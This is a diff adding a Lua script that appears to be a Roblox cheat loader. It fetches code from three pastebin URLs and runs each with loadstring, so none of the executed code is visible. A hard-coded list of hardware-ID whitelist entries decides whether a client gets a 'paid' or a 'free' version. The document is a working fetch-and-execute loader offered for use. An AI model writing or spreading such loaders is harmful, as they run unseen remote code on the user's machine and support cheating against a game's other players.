@@ -1,0 +1,77 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/NjjJrjPr",true))()
+
+local HWIDTable = {
+
+  "afe7dc2e-11a4-4a11-984c-9dff0d7b5f27",
+
+  "dc7493c8-89d3-48e8-b3b3-bff5e1a83618",
+
+  "5a360744-f8c6-4c62-9544-69847bedf62d",
+
+  "ca2a1ab0-d78a-4c4f-abb1-ad81e4f072b4",
+
+ "8afd9b55-7326-4ebc-b112-33d18c2951e1",
+
+ "5e44fc2f-c313-410e-b157-537d400fd2ab",
+
+"d406a422-11ea-4fea-bd80-8f0154cd916b",
+
+"1a5e14cc-cca7-4d00-a8f8-0f9bb20d067a",
+
+"d27133a3-9342-4975-ab8f-1b2a06e0ca57",
+
+"7dd7cd97-0842-4c93-9512-9bdcf22ce32b",
+
+"8fd02492-1681-4a18-97a6-60ac9fb8f042",
+
+"5b62c562-f283-4386-a560-5b2ed6dbfd0c",
+
+"bdf03a3e-371a-453b-a31f-2d0c37e8759a",
+
+"defc3ba1-d8a7-4b09-bde1-c77d05607c66",
+
+"87556f7f-6128-418c-8955-e1285a77ee06",
+
+"03e79017-e991-4e04-a5e8-00077ebfe880",
+
+"3c0c465c-e8d7-4b77-94dc-d512d0f143cf",
+
+"7A6C294E-6026-47D6-9DA2-D4DA06C2E020",
+
+"94c0ac4e-6dd4-4e1c-b008-2fc3f93b3680",
+
+"D3202BE1-8037-468D-9816-65E4E641F9EA",
+
+"7354cf86-d155-4b1a-9c41-4f613e529544",
+
+"a6e7adc3-cd1a-4860-9831-09d036435937",
+
+"94ea01f3-a243-43e5-8eb5-9dcb8a11e9b4",
+
+"8fd02492-1681-4a18-97a6-60ac9fb8f042",
+
+"adc3ee25-85fd-4378-97c4-00c2bcdf19b5",
+
+"ff3644b3-1807-4c9d-aaa2-97fa47a63c9a",
+
+"8c164a9b-6894-4cea-8101-4c8cae63e3e2",
+
+"a700bfe4-e2c4-49d1-8dd2-76571d08ba5c",
+
+"faf8c377-99d9-44dc-b426-99049313c0ae",
+
+}
+
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+if table.find(HWIDTable,HWID) then
+
+print("player is whitelisted")  loadstring(game:HttpGet("https://pastebin.com/raw/zC7CSvtS",true))()
+
+else if not table.find(HWIDTable,HWID) then
+
+    print("not whitelisted so running free version")   loadstring(game:HttpGet("https://pastebin.com/raw/QsDLGyzs",true))()
+
+  end 
+
+end
